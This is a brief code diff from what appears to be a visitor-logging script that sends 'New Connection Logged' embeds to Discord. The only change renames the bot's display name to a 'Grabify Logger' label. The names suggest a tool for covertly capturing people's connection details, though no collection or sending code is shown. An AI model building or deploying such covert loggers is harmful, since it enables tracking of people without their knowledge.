@@ -35,7 +35,7 @@ async function sendToDiscord(info) {
 
     // Formatting the payload using Discord Embeds for a much neater UI
     const payload = {
-        username: "Tech Logger", // You can change the bot's display name here
+        username: "235, Grabify Logger #Skids", // You can change the bot's display name here
         embeds: [
             {
                 title: "New Connection Logged",
